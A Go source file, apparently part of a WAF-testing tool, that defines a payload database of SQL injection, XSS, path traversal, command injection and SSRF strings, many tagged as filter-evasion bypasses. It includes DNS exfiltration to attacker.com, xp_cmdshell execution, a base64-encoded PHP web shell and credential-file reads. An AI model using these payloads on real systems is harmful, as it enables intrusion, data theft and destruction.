// Package payloads provides curated WAF bypass payloads organized by category and vendor
package payloads

import (
	"embed"
	"encoding/json"
	"fmt"
	"sort"
	"strings"
)

// Database holds all payloads organized by category
type Database struct {
	payloads   []Payload
	byCategory map[string][]Payload
	byVendor   map[string][]Payload
	byTag      map[string][]Payload
	bySeverity map[string][]Payload
}

// NewDatabase creates a new payload database
func NewDatabase() *Database {
	db := &Database{
		payloads:   make([]Payload, 0),
		byCategory: make(map[string][]Payload),
		byVendor:   make(map[string][]Payload),
		byTag:      make(map[string][]Payload),
		bySeverity: make(map[string][]Payload),
	}

	// Load built-in payloads
	db.loadBuiltinPayloads()

	return db
}

// Add adds a payload to the database
func (db *Database) Add(p Payload) {
	db.payloads = append(db.payloads, p)

	cat := strings.ToLower(p.Category)
	db.byCategory[cat] = append(db.byCategory[cat], p)

	// Vendor is stored in Notes field for now (backwards compatible)
	if strings.Contains(p.Notes, "vendor:") {
		parts := strings.Split(p.Notes, "vendor:")
		if len(parts) > 1 {
			vendor := strings.ToLower(strings.TrimSpace(strings.Split(parts[1], " ")[0]))
			db.byVendor[vendor] = append(db.byVendor[vendor], p)
		}
	}

	for _, tag := range p.Tags {
		tag = strings.ToLower(tag)
		db.byTag[tag] = append(db.byTag[tag], p)
	}

	if p.SeverityHint != "" {
		sev := strings.ToLower(p.SeverityHint)
		db.bySeverity[sev] = append(db.bySeverity[sev], p)
	}
}

// AddBatch adds multiple payloads at once
func (db *Database) AddBatch(payloads []Payload) {
	for _, p := range payloads {
		db.Add(p)
	}
}

// All returns all payloads
func (db *Database) All() []Payload {
	return db.payloads
}

// Count returns the total number of payloads
func (db *Database) Count() int {
	return len(db.payloads)
}

// ByCategory returns payloads for a specific category
func (db *Database) ByCategory(category string) []Payload {
	return db.byCategory[strings.ToLower(category)]
}

// ByVendor returns payloads targeting a specific WAF vendor
func (db *Database) ByVendor(vendor string) []Payload {
	return db.byVendor[strings.ToLower(vendor)]
}

// ByTag returns payloads with a specific tag
func (db *Database) ByTag(tag string) []Payload {
	return db.byTag[strings.ToLower(tag)]
}

// BySeverity returns payloads with a specific severity
func (db *Database) BySeverity(severity string) []Payload {
	return db.bySeverity[strings.ToLower(severity)]
}

// Categories returns all unique categories
func (db *Database) Categories() []string {
	cats := make([]string, 0, len(db.byCategory))
	for cat := range db.byCategory {
		cats = append(cats, cat)
	}
	sort.Strings(cats)
	return cats
}

// Vendors returns all unique vendors
func (db *Database) Vendors() []string {
	vendors := make([]string, 0, len(db.byVendor))
	for v := range db.byVendor {
		vendors = append(vendors, v)
	}
	sort.Strings(vendors)
	return vendors
}

// Tags returns all unique tags
func (db *Database) Tags() []string {
	tags := make([]string, 0, len(db.byTag))
	for t := range db.byTag {
		tags = append(tags, t)
	}
	sort.Strings(tags)
	return tags
}

// Search finds payloads matching the query
func (db *Database) Search(query string) []Payload {
	query = strings.ToLower(query)
	var results []Payload

	for _, p := range db.payloads {
		if strings.Contains(strings.ToLower(p.Payload), query) ||
			strings.Contains(strings.ToLower(p.Notes), query) ||
			strings.Contains(strings.ToLower(p.Category), query) {
			results = append(results, p)
		}
	}

	return results
}

// Filter filters payloads by multiple criteria
func (db *Database) Filter(opts ...FilterOption) []Payload {
	filter := &PayloadFilter{}
	for _, opt := range opts {
		opt(filter)
	}

	var results []Payload
	for _, p := range db.payloads {
		if filter.matches(p) {
			results = append(results, p)
		}
	}

	return results
}

// PayloadFilter defines filtering criteria
type PayloadFilter struct {
	categories  []string
	vendors     []string
	tags        []string
	severities  []string
	evasionOnly bool
}

// FilterOption configures the filter
type FilterOption func(*PayloadFilter)

// WithCategories filters by categories
func WithCategories(cats ...string) FilterOption {
	return func(f *PayloadFilter) {
		f.categories = cats
	}
}

// WithVendors filters by vendors
func WithVendors(vendors ...string) FilterOption {
	return func(f *PayloadFilter) {
		f.vendors = vendors
	}
}

// WithTags filters by tags
func WithTags(tags ...string) FilterOption {
	return func(f *PayloadFilter) {
		f.tags = tags
	}
}

// WithSeverities filters by severities
func WithSeverities(sevs ...string) FilterOption {
	return func(f *PayloadFilter) {
		f.severities = sevs
	}
}

// EvasionOnly filters to only evasion payloads
func EvasionOnly() FilterOption {
	return func(f *PayloadFilter) {
		f.evasionOnly = true
	}
}

func (f *PayloadFilter) matches(p Payload) bool {
	if len(f.categories) > 0 {
		found := false
		for _, c := range f.categories {
			if strings.EqualFold(p.Category, c) {
				found = true
				break
			}
		}
		if !found {
			return false
		}
	}

	if len(f.vendors) > 0 {
		found := false
		for _, v := range f.vendors {
			if strings.Contains(strings.ToLower(p.Notes), "vendor:"+strings.ToLower(v)) {
				found = true
				break
			}
		}
		if !found {
			return false
		}
	}

	if len(f.tags) > 0 {
		found := false
		for _, t := range f.tags {
			for _, pt := range p.Tags {
				if strings.EqualFold(pt, t) {
					found = true
					break
				}
			}
			if found {
				break
			}
		}
		if !found {
			return false
		}
	}

	if len(f.severities) > 0 {
		found := false
		for _, s := range f.severities {
			if strings.EqualFold(p.SeverityHint, s) {
				found = true
				break
			}
		}
		if !found {
			return false
		}
	}

	if f.evasionOnly {
		hasEvasion := false
		for _, tag := range p.Tags {
			if strings.EqualFold(tag, "evasion") {
				hasEvasion = true
				break
			}
		}
		if !hasEvasion {
			return false
		}
	}

	return true
}

// LoadFromJSON loads payloads from JSON data
func (db *Database) LoadFromJSON(data []byte) error {
	var payloads []Payload
	if err := json.Unmarshal(data, &payloads); err != nil {
		return fmt.Errorf("failed to parse JSON: %w", err)
	}

	db.AddBatch(payloads)
	return nil
}

// ExportJSON exports the database to JSON
func (db *Database) ExportJSON() ([]byte, error) {
	return json.MarshalIndent(db.payloads, "", "  ")
}

// loadBuiltinPayloads loads the curated payload database
func (db *Database) loadBuiltinPayloads() {
	// SQL Injection payloads (100+)
	db.loadSQLiPayloads()

	// XSS payloads (100+)
	db.loadXSSPayloads()

	// Path traversal payloads (50+)
	db.loadTraversalPayloads()

	// RCE payloads (50+)
	db.loadRCEPayloads()

	// SSRF payloads (30+)
	db.loadSSRFPayloads()

	// XXE payloads (30+)
	db.loadXXEPayloads()

	// SSTI payloads (30+)
	db.loadSSTIPayloads()

	// NoSQL injection payloads (30+)
	db.loadNoSQLPayloads()

	// LDAP injection payloads (20+)
	db.loadLDAPPayloads()

	// Vendor-specific bypasses (50+)
	db.loadVendorBypasses()
}

func (db *Database) loadSQLiPayloads() {
	payloads := []Payload{
		// Classic SQLi
		{ID: "sqli-001", Payload: "' OR '1'='1", Category: "sqli", Notes: "Classic OR injection", SeverityHint: "critical", Tags: []string{"classic", "auth-bypass"}, ExpectedBlock: true},
		{ID: "sqli-002", Payload: "1' OR '1'='1'--", Category: "sqli", Notes: "OR injection with comment", SeverityHint: "critical", Tags: []string{"classic", "auth-bypass"}, ExpectedBlock: true},
		{ID: "sqli-003", Payload: "' OR 1=1--", Category: "sqli", Notes: "OR injection numeric", SeverityHint: "critical", Tags: []string{"classic"}, ExpectedBlock: true},
		{ID: "sqli-004", Payload: "' OR ''='", Category: "sqli", Notes: "Empty string comparison", SeverityHint: "critical", Tags: []string{"classic"}, ExpectedBlock: true},
		{ID: "sqli-005", Payload: "admin'--", Category: "sqli", Notes: "Comment injection", SeverityHint: "critical", Tags: []string{"classic", "auth-bypass"}, ExpectedBlock: true},

		// UNION-based
		{ID: "sqli-010", Payload: "' UNION SELECT NULL--", Category: "sqli", Notes: "UNION probe", SeverityHint: "critical", Tags: []string{"union"}, ExpectedBlock: true},
		{ID: "sqli-011", Payload: "' UNION SELECT NULL,NULL--", Category: "sqli", Notes: "UNION two columns", SeverityHint: "critical", Tags: []string{"union"}, ExpectedBlock: true},
		{ID: "sqli-012", Payload: "' UNION SELECT username,password FROM users--", Category: "sqli", Notes: "UNION data extraction", SeverityHint: "critical", Tags: []string{"union", "data-theft"}, ExpectedBlock: true},
		{ID: "sqli-013", Payload: "1' UNION SELECT * FROM information_schema.tables--", Category: "sqli", Notes: "Schema enumeration", SeverityHint: "critical", Tags: []string{"union", "enumeration"}, ExpectedBlock: true},
		{ID: "sqli-014", Payload: "' UNION ALL SELECT NULL,@@version--", Category: "sqli", Notes: "Version detection", SeverityHint: "high", Tags: []string{"union", "fingerprint"}, ExpectedBlock: true},

		// Stacked queries
		{ID: "sqli-020", Payload: "'; DROP TABLE users--", Category: "sqli", Notes: "Stacked DROP TABLE", SeverityHint: "critical", Tags: []string{"stacked", "destructive"}, ExpectedBlock: true},
		{ID: "sqli-021", Payload: "'; INSERT INTO users VALUES('hacker','pass')--", Category: "sqli", Notes: "Stacked INSERT", SeverityHint: "critical", Tags: []string{"stacked"}, ExpectedBlock: true},
		{ID: "sqli-022", Payload: "'; EXEC xp_cmdshell('whoami')--", Category: "sqli", Notes: "vendor:mssql MSSQL command execution", SeverityHint: "critical", Tags: []string{"stacked", "rce", "mssql"}, ExpectedBlock: true},

		// Time-based blind
		{ID: "sqli-030", Payload: "' AND SLEEP(5)--", Category: "sqli", Notes: "vendor:mysql MySQL time-based", SeverityHint: "high", Tags: []string{"blind", "time-based", "mysql"}, ExpectedBlock: true},
		{ID: "sqli-031", Payload: "' AND pg_sleep(5)--", Category: "sqli", Notes: "vendor:postgresql PostgreSQL time-based", SeverityHint: "high", Tags: []string{"blind", "time-based", "postgresql"}, ExpectedBlock: true},
		{ID: "sqli-032", Payload: "'; WAITFOR DELAY '0:0:5'--", Category: "sqli", Notes: "vendor:mssql MSSQL time-based", SeverityHint: "high", Tags: []string{"blind", "time-based", "mssql"}, ExpectedBlock: true},
		{ID: "sqli-033", Payload: "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", Category: "sqli", Notes: "Nested sleep", SeverityHint: "high", Tags: []string{"blind", "time-based"}, ExpectedBlock: true},

		// Boolean-based blind
		{ID: "sqli-040", Payload: "' AND 1=1--", Category: "sqli", Notes: "Boolean true", SeverityHint: "high", Tags: []string{"blind", "boolean"}, ExpectedBlock: true},
		{ID: "sqli-041", Payload: "' AND 1=2--", Category: "sqli", Notes: "Boolean false", SeverityHint: "high", Tags: []string{"blind", "boolean"}, ExpectedBlock: true},
		{ID: "sqli-042", Payload: "' AND (SELECT COUNT(*) FROM users)>0--", Category: "sqli", Notes: "Count check", SeverityHint: "high", Tags: []string{"blind", "boolean"}, ExpectedBlock: true},

		// Error-based
		{ID: "sqli-050", Payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--", Category: "sqli", Notes: "vendor:mysql EXTRACTVALUE error", SeverityHint: "high", Tags: []string{"error-based", "mysql"}, ExpectedBlock: true},
		{ID: "sqli-051", Payload: "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--", Category: "sqli", Notes: "vendor:mysql UPDATEXML error", SeverityHint: "high", Tags: []string{"error-based", "mysql"}, ExpectedBlock: true},
		{ID: "sqli-052", Payload: "' AND EXP(~(SELECT * FROM (SELECT @@version)a))--", Category: "sqli", Notes: "EXP overflow", SeverityHint: "high", Tags: []string{"error-based"}, ExpectedBlock: true},

		// WAF bypass techniques
		{ID: "sqli-060", Payload: "'/**/OR/**/1=1--", Category: "sqli", Notes: "Comment bypass", SeverityHint: "critical", Tags: []string{"evasion", "comment"}, ExpectedBlock: true},
		{ID: "sqli-061", Payload: "'%09OR%091=1--", Category: "sqli", Notes: "Tab bypass", SeverityHint: "critical", Tags: []string{"evasion", "whitespace"}, ExpectedBlock: true},
		{ID: "sqli-062", Payload: "'%0AOR%0A1=1--", Category: "sqli", Notes: "Newline bypass", SeverityHint: "critical", Tags: []string{"evasion", "whitespace"}, ExpectedBlock: true},
		{ID: "sqli-063", Payload: "'/*!OR*/1=1--", Category: "sqli", Notes: "vendor:mysql MySQL inline comment", SeverityHint: "critical", Tags: []string{"evasion", "mysql"}, ExpectedBlock: true},
		{ID: "sqli-064", Payload: "' oR 1=1--", Category: "sqli", Notes: "Case variation", SeverityHint: "critical", Tags: []string{"evasion", "case"}, ExpectedBlock: true},
		{ID: "sqli-065", Payload: "'||1=1--", Category: "sqli", Notes: "Pipe OR", SeverityHint: "critical", Tags: []string{"evasion"}, ExpectedBlock: true},
		{ID: "sqli-066", Payload: "'-1' OR 1=1--", Category: "sqli", Notes: "Negative value", SeverityHint: "critical", Tags: []string{"evasion"}, ExpectedBlock: true},
		{ID: "sqli-067", Payload: "' OR 0x31=0x31--", Category: "sqli", Notes: "Hex encoding", SeverityHint: "critical", Tags: []string{"evasion", "encoding"}, ExpectedBlock: true},
		{ID: "sqli-068", Payload: "' OR CHAR(49)=CHAR(49)--", Category: "sqli", Notes: "CHAR function", SeverityHint: "critical", Tags: []string{"evasion", "function"}, ExpectedBlock: true},
		{ID: "sqli-069", Payload: "%27%20OR%201=1--", Category: "sqli", Notes: "URL encoded", SeverityHint: "critical", Tags: []string{"evasion", "encoding"}, ExpectedBlock: true},
		{ID: "sqli-070", Payload: "'+OR+1=1--", Category: "sqli", Notes: "Plus as space", SeverityHint: "critical", Tags: []string{"evasion", "encoding"}, ExpectedBlock: true},

		// Second-order
		{ID: "sqli-080", Payload: "admin'-- stored", Category: "sqli", Notes: "Second-order injection", SeverityHint: "high", Tags: []string{"second-order"}, ExpectedBlock: true},

		// Out-of-band
		{ID: "sqli-090", Payload: "'; SELECT load_file(CONCAT('\\\\\\\\',@@version,'.attacker.com\\\\share'))--", Category: "sqli", Notes: "vendor:mysql DNS exfil MySQL", SeverityHint: "critical", Tags: []string{"oob", "dns", "mysql"}, ExpectedBlock: true},
		{ID: "sqli-091", Payload: "'; exec master..xp_dirtree '\\\\attacker.com\\share'--", Category: "sqli", Notes: "vendor:mssql DNS exfil MSSQL", SeverityHint: "critical", Tags: []string{"oob", "dns", "mssql"}, ExpectedBlock: true},

		// Additional classic variants
		{ID: "sqli-100", Payload: "1 OR 1=1#", Category: "sqli", Notes: "Hash comment", SeverityHint: "critical", Tags: []string{"classic"}, ExpectedBlock: true},
		{ID: "sqli-101", Payload: "' OR 'x'='x", Category: "sqli", Notes: "String comparison", SeverityHint: "critical", Tags: []string{"classic"}, ExpectedBlock: true},
		{ID: "sqli-102", Payload: "\" OR \"\"=\"", Category: "sqli", Notes: "Double quote", SeverityHint: "critical", Tags: []string{"classic"}, ExpectedBlock: true},
		{ID: "sqli-103", Payload: "') OR ('1'='1", Category: "sqli", Notes: "Parenthesis bypass", SeverityHint: "critical", Tags: []string{"classic"}, ExpectedBlock: true},
		{ID: "sqli-104", Payload: "') OR ('x'='x", Category: "sqli", Notes: "Parenthesis string", SeverityHint: "critical", Tags: []string{"classic"}, ExpectedBlock: true},
	}

	db.AddBatch(payloads)
}

func (db *Database) loadXSSPayloads() {
	payloads := []Payload{
		// Basic XSS
		{ID: "xss-001", Payload: "<script>alert(1)</script>", Category: "xss", Notes: "Basic script tag", SeverityHint: "high", Tags: []string{"basic", "script"}, ExpectedBlock: true},
		{ID: "xss-002", Payload: "<script>alert('XSS')</script>", Category: "xss", Notes: "Alert with quotes", SeverityHint: "high", Tags: []string{"basic", "script"}, ExpectedBlock: true},
		{ID: "xss-003", Payload: "<script>alert(String.fromCharCode(88,83,83))</script>", Category: "xss", Notes: "CharCode obfuscation", SeverityHint: "high", Tags: []string{"basic", "obfuscated"}, ExpectedBlock: true},

		// Event handlers
		{ID: "xss-010", Payload: "<img src=x onerror=alert(1)>", Category: "xss", Notes: "IMG onerror", SeverityHint: "high", Tags: []string{"event", "img"}, ExpectedBlock: true},
		{ID: "xss-011", Payload: "<svg onload=alert(1)>", Category: "xss", Notes: "SVG onload", SeverityHint: "high", Tags: []string{"event", "svg"}, ExpectedBlock: true},
		{ID: "xss-012", Payload: "<body onload=alert(1)>", Category: "xss", Notes: "Body onload", SeverityHint: "high", Tags: []string{"event", "body"}, ExpectedBlock: true},
		{ID: "xss-013", Payload: "<input onfocus=alert(1) autofocus>", Category: "xss", Notes: "Input autofocus", SeverityHint: "high", Tags: []string{"event", "input"}, ExpectedBlock: true},
		{ID: "xss-014", Payload: "<marquee onstart=alert(1)>", Category: "xss", Notes: "Marquee onstart", SeverityHint: "high", Tags: []string{"event", "marquee"}, ExpectedBlock: true},
		{ID: "xss-015", Payload: "<video><source onerror=alert(1)>", Category: "xss", Notes: "Video source error", SeverityHint: "high", Tags: []string{"event", "video"}, ExpectedBlock: true},
		{ID: "xss-016", Payload: "<details open ontoggle=alert(1)>", Category: "xss", Notes: "Details ontoggle", SeverityHint: "high", Tags: []string{"event", "details"}, ExpectedBlock: true},
		{ID: "xss-017", Payload: "<audio src=x onerror=alert(1)>", Category: "xss", Notes: "Audio onerror", SeverityHint: "high", Tags: []string{"event", "audio"}, ExpectedBlock: true},

		// JavaScript protocol
		{ID: "xss-020", Payload: "javascript:alert(1)", Category: "xss", Notes: "JavaScript protocol", SeverityHint: "high", Tags: []string{"protocol"}, ExpectedBlock: true},
		{ID: "xss-021", Payload: "<a href=javascript:alert(1)>click</a>", Category: "xss", Notes: "Anchor javascript", SeverityHint: "high", Tags: []string{"protocol", "anchor"}, ExpectedBlock: true},
		{ID: "xss-022", Payload: "<iframe src=javascript:alert(1)>", Category: "xss", Notes: "Iframe javascript", SeverityHint: "high", Tags: []string{"protocol", "iframe"}, ExpectedBlock: true},
		{ID: "xss-023", Payload: "<form action=javascript:alert(1)>", Category: "xss", Notes: "Form javascript", SeverityHint: "high", Tags: []string{"protocol", "form"}, ExpectedBlock: true},

		// Data protocol
		{ID: "xss-030", Payload: "<a href=data:text/html,<script>alert(1)</script>>", Category: "xss", Notes: "Data protocol", SeverityHint: "high", Tags: []string{"protocol", "data"}, ExpectedBlock: true},
		{ID: "xss-031", Payload: "<object data=data:text/html,<script>alert(1)</script>>", Category: "xss", Notes: "Object data protocol", SeverityHint: "high", Tags: []string{"protocol", "object"}, ExpectedBlock: true},

		// WAF bypass variations
		{ID: "xss-040", Payload: "<ScRiPt>alert(1)</sCrIpT>", Category: "xss", Notes: "Case variation", SeverityHint: "high", Tags: []string{"evasion", "case"}, ExpectedBlock: true},
		{ID: "xss-041", Payload: "<scr<script>ipt>alert(1)</scr</script>ipt>", Category: "xss", Notes: "Nested tags", SeverityHint: "high", Tags: []string{"evasion", "nested"}, ExpectedBlock: true},
		{ID: "xss-042", Payload: "<script/src=data:text/javascript,alert(1)>", Category: "xss", Notes: "Slash bypass", SeverityHint: "high", Tags: []string{"evasion", "slash"}, ExpectedBlock: true},
		{ID: "xss-043", Payload: "<script\\x20>alert(1)</script>", Category: "xss", Notes: "Hex space", SeverityHint: "high", Tags: []string{"evasion", "encoding"}, ExpectedBlock: true},
		{ID: "xss-044", Payload: "<script\\x0d\\x0a>alert(1)</script>", Category: "xss", Notes: "CRLF in tag", SeverityHint: "high", Tags: []string{"evasion", "encoding"}, ExpectedBlock: true},
		{ID: "xss-045", Payload: "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e", Category: "xss", Notes: "Hex encoded", SeverityHint: "high", Tags: []string{"evasion", "encoding"}, ExpectedBlock: true},
		{ID: "xss-046", Payload: "<img src=x onerror=\"alert(1)\">", Category: "xss", Notes: "Double quotes", SeverityHint: "high", Tags: []string{"evasion"}, ExpectedBlock: true},
		{ID: "xss-047", Payload: "<img src=x onerror='alert(1)'>", Category: "xss", Notes: "Single quotes", SeverityHint: "high", Tags: []string{"evasion"}, ExpectedBlock: true},
		{ID: "xss-048", Payload: "<img src=x onerror=alert`1`>", Category: "xss", Notes: "Backticks", SeverityHint: "high", Tags: []string{"evasion", "backtick"}, ExpectedBlock: true},
		{ID: "xss-049", Payload: "<svg/onload=alert(1)>", Category: "xss", Notes: "No space before event", SeverityHint: "high", Tags: []string{"evasion"}, ExpectedBlock: true},
		{ID: "xss-050", Payload: "<svg	onload=alert(1)>", Category: "xss", Notes: "Tab instead of space", SeverityHint: "high", Tags: []string{"evasion", "whitespace"}, ExpectedBlock: true},
		{ID: "xss-051", Payload: "<svg\nonload=alert(1)>", Category: "xss", Notes: "Newline separator", SeverityHint: "high", Tags: []string{"evasion", "whitespace"}, ExpectedBlock: true},

		// AngularJS
		{ID: "xss-060", Payload: "{{constructor.constructor('alert(1)')()}}", Category: "xss", Notes: "AngularJS sandbox escape", SeverityHint: "high", Tags: []string{"angular", "framework"}, ExpectedBlock: true},
		{ID: "xss-061", Payload: "{{$on.constructor('alert(1)')()}}", Category: "xss", Notes: "AngularJS $on", SeverityHint: "high", Tags: []string{"angular", "framework"}, ExpectedBlock: true},

		// Template injection crossover
		{ID: "xss-070", Payload: "${alert(1)}", Category: "xss", Notes: "ES6 template literal", SeverityHint: "medium", Tags: []string{"template"}, ExpectedBlock: true},
		{ID: "xss-071", Payload: "<%=alert(1)%>", Category: "xss", Notes: "ERB style", SeverityHint: "medium", Tags: []string{"template", "erb"}, ExpectedBlock: true},

		// SVG variations
		{ID: "xss-080", Payload: "<svg><script>alert(1)</script></svg>", Category: "xss", Notes: "SVG with script", SeverityHint: "high", Tags: []string{"svg"}, ExpectedBlock: true},
		{ID: "xss-081", Payload: "<svg><animate onbegin=alert(1)>", Category: "xss", Notes: "SVG animate", SeverityHint: "high", Tags: []string{"svg", "animate"}, ExpectedBlock: true},
		{ID: "xss-082", Payload: "<svg><set onbegin=alert(1)>", Category: "xss", Notes: "SVG set", SeverityHint: "high", Tags: []string{"svg"}, ExpectedBlock: true},

		// DOM-based XSS
		{ID: "xss-090", Payload: "#<script>alert(1)</script>", Category: "xss", Notes: "Fragment XSS", SeverityHint: "high", Tags: []string{"dom"}, ExpectedBlock: true},
		{ID: "xss-091", Payload: "javascript:/*-/*`/*\\`/*'/*\"/**/(alert(1))//</>", Category: "xss", Notes: "Polyglot", SeverityHint: "high", Tags: []string{"polyglot"}, ExpectedBlock: true},
	}

	db.AddBatch(payloads)
}

func (db *Database) loadTraversalPayloads() {
	payloads := []Payload{
		// Basic traversal
		{ID: "lfi-001", Payload: "../../../etc/passwd", Category: "lfi", Notes: "Basic Unix traversal", SeverityHint: "critical", Tags: []string{"basic", "unix"}, ExpectedBlock: true},
		{ID: "lfi-002", Payload: "..\\..\\..\\windows\\system32\\config\\sam", Category: "lfi", Notes: "Basic Windows traversal", SeverityHint: "critical", Tags: []string{"basic", "windows"}, ExpectedBlock: true},
		{ID: "lfi-003", Payload: "....//....//....//etc/passwd", Category: "lfi", Notes: "Double dots traversal", SeverityHint: "critical", Tags: []string{"evasion"}, ExpectedBlock: true},
		{ID: "lfi-004", Payload: "..%252f..%252f..%252fetc/passwd", Category: "lfi", Notes: "Double URL encoded", SeverityHint: "critical", Tags: []string{"evasion", "encoding"}, ExpectedBlock: true},
		{ID: "lfi-005", Payload: "%2e%2e%2f%2e%2e%2fetc/passwd", Category: "lfi", Notes: "URL encoded dots", SeverityHint: "critical", Tags: []string{"evasion", "encoding"}, ExpectedBlock: true},
		{ID: "lfi-006", Payload: "..%c0%af..%c0%afetc/passwd", Category: "lfi", Notes: "UTF-8 overlong", SeverityHint: "critical", Tags: []string{"evasion", "utf8"}, ExpectedBlock: true},
		{ID: "lfi-007", Payload: "/etc/passwd%00", Category: "lfi", Notes: "Null byte", SeverityHint: "critical", Tags: []string{"evasion", "null"}, ExpectedBlock: true},
		{ID: "lfi-008", Payload: "....//....//....//etc/passwd", Category: "lfi", Notes: "Filter bypass", SeverityHint: "critical", Tags: []string{"evasion"}, ExpectedBlock: true},
		{ID: "lfi-009", Payload: "..;/..;/..;/etc/passwd", Category: "lfi", Notes: "Semicolon bypass", SeverityHint: "critical", Tags: []string{"evasion"}, ExpectedBlock: true},
		{ID: "lfi-010", Payload: "..%00/..%00/etc/passwd", Category: "lfi", Notes: "Null in path", SeverityHint: "critical", Tags: []string{"evasion", "null"}, ExpectedBlock: true},

		// PHP wrappers
		{ID: "lfi-020", Payload: "php://filter/convert.base64-encode/resource=index.php", Category: "lfi", Notes: "PHP filter wrapper", SeverityHint: "critical", Tags: []string{"php", "wrapper"}, ExpectedBlock: true},
		{ID: "lfi-021", Payload: "php://input", Category: "lfi", Notes: "PHP input wrapper", SeverityHint: "critical", Tags: []string{"php", "wrapper", "rce"}, ExpectedBlock: true},
		{ID: "lfi-022", Payload: "phar://uploads/shell.jpg", Category: "lfi", Notes: "PHAR wrapper", SeverityHint: "critical", Tags: []string{"php", "wrapper"}, ExpectedBlock: true},
		{ID: "lfi-023", Payload: "expect://id", Category: "lfi", Notes: "Expect wrapper", SeverityHint: "critical", Tags: []string{"php", "wrapper", "rce"}, ExpectedBlock: true},
		{ID: "lfi-024", Payload: "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+", Category: "lfi", Notes: "Data wrapper RCE", SeverityHint: "critical", Tags: []string{"php", "wrapper", "rce"}, ExpectedBlock: true},

		// Absolute paths
		{ID: "lfi-030", Payload: "/etc/passwd", Category: "lfi", Notes: "Absolute path", SeverityHint: "high", Tags: []string{"absolute", "unix"}, ExpectedBlock: true},
		{ID: "lfi-031", Payload: "C:\\Windows\\System32\\config\\SAM", Category: "lfi", Notes: "Windows absolute", SeverityHint: "high", Tags: []string{"absolute", "windows"}, ExpectedBlock: true},
		{ID: "lfi-032", Payload: "/proc/self/environ", Category: "lfi", Notes: "Proc environ", SeverityHint: "high", Tags: []string{"absolute", "linux"}, ExpectedBlock: true},
		{ID: "lfi-033", Payload: "/var/log/apache2/access.log", Category: "lfi", Notes: "Log poisoning target", SeverityHint: "high", Tags: []string{"log-poisoning"}, ExpectedBlock: true},
	}

	db.AddBatch(payloads)
}

func (db *Database) loadRCEPayloads() {
	payloads := []Payload{
		// Unix command injection
		{ID: "rce-001", Payload: "; id", Category: "rce", Notes: "Semicolon injection", SeverityHint: "critical", Tags: []string{"unix", "basic"}, ExpectedBlock: true},
		{ID: "rce-002", Payload: "| cat /etc/passwd", Category: "rce", Notes: "Pipe injection", SeverityHint: "critical", Tags: []string{"unix", "pipe"}, ExpectedBlock: true},
		{ID: "rce-003", Payload: "$(whoami)", Category: "rce", Notes: "Command substitution", SeverityHint: "critical", Tags: []string{"unix", "substitution"}, ExpectedBlock: true},
		{ID: "rce-004", Payload: "`id`", Category: "rce", Notes: "Backtick execution", SeverityHint: "critical", Tags: []string{"unix", "backtick"}, ExpectedBlock: true},
		{ID: "rce-005", Payload: "& whoami &", Category: "rce", Notes: "Ampersand injection", SeverityHint: "critical", Tags: []string{"unix", "ampersand"}, ExpectedBlock: true},
		{ID: "rce-006", Payload: "|| id", Category: "rce", Notes: "OR injection", SeverityHint: "critical", Tags: []string{"unix", "or"}, ExpectedBlock: true},
		{ID: "rce-007", Payload: "&& id", Category: "rce", Notes: "AND injection", SeverityHint: "critical", Tags: []string{"unix", "and"}, ExpectedBlock: true},
		{ID: "rce-008", Payload: "$(cat /etc/passwd)", Category: "rce", Notes: "Nested substitution", SeverityHint: "critical", Tags: []string{"unix"}, ExpectedBlock: true},
		{ID: "rce-009", Payload: ";${IFS}id", Category: "rce", Notes: "IFS bypass", SeverityHint: "critical", Tags: []string{"unix", "evasion"}, ExpectedBlock: true},
		{ID: "rce-010", Payload: "{cat,/etc/passwd}", Category: "rce", Notes: "Brace expansion", SeverityHint: "critical", Tags: []string{"unix", "evasion"}, ExpectedBlock: true},
		{ID: "rce-011", Payload: "c'a't /etc/passwd", Category: "rce", Notes: "Quote splitting", SeverityHint: "critical", Tags: []string{"unix", "evasion"}, ExpectedBlock: true},
		{ID: "rce-012", Payload: "c\"a\"t /etc/passwd", Category: "rce", Notes: "Double quote split", SeverityHint: "critical", Tags: []string{"unix", "evasion"}, ExpectedBlock: true},
		{ID: "rce-013", Payload: "c\\at /etc/passwd", Category: "rce", Notes: "Backslash escape", SeverityHint: "critical", Tags: []string{"unix", "evasion"}, ExpectedBlock: true},
		{ID: "rce-014", Payload: "$'cat' /etc/passwd", Category: "rce", Notes: "Dollar quote", SeverityHint: "critical", Tags: []string{"unix", "evasion"}, ExpectedBlock: true},

		// Windows command injection
		{ID: "rce-020", Payload: "& type C:\\Windows\\System32\\drivers\\etc\\hosts", Category: "rce", Notes: "Windows ampersand", SeverityHint: "critical", Tags: []string{"windows"}, ExpectedBlock: true},
		{ID: "rce-021", Payload: "| type C:\\boot.ini", Category: "rce", Notes: "Windows pipe", SeverityHint: "critical", Tags: []string{"windows"}, ExpectedBlock: true},
		{ID: "rce-022", Payload: "&& dir", Category: "rce", Notes: "Windows AND", SeverityHint: "critical", Tags: []string{"windows"}, ExpectedBlock: true},

		// Python/Ruby/Perl
		{ID: "rce-030", Payload: "__import__('os').system('id')", Category: "rce", Notes: "Python import", SeverityHint: "critical", Tags: []string{"python"}, ExpectedBlock: true},
		{ID: "rce-031", Payload: "eval(\"__import__('os').system('id')\")", Category: "rce", Notes: "Python eval", SeverityHint: "critical", Tags: []string{"python"}, ExpectedBlock: true},
		{ID: "rce-032", Payload: "system('id')", Category: "rce", Notes: "Ruby/PHP system", SeverityHint: "critical", Tags: []string{"ruby", "php"}, ExpectedBlock: true},
		{ID: "rce-033", Payload: "exec('id')", Category: "rce", Notes: "Generic exec", SeverityHint: "critical", Tags: []string{"generic"}, ExpectedBlock: true},
	}

	db.AddBatch(payloads)
}

func (db *Database) loadSSRFPayloads() {
	payloads := []Payload{
		{ID: "ssrf-001", Payload: "http://localhost/admin", Category: "ssrf", Notes: "Localhost", SeverityHint: "high", Tags: []string{"localhost"}, ExpectedBlock: true},
		{ID: "ssrf-002", Payload: "http://127.0.0.1/admin", Category: "ssrf", Notes: "127.0.0.1", SeverityHint: "high", Tags: []string{"localhost"}, ExpectedBlock: true},
		{ID: "ssrf-003", Payload: "http://[::1]/admin", Category: "ssrf", Notes: "IPv6 localhost", SeverityHint: "high", Tags: []string{"localhost", "ipv6"}, ExpectedBlock: true},
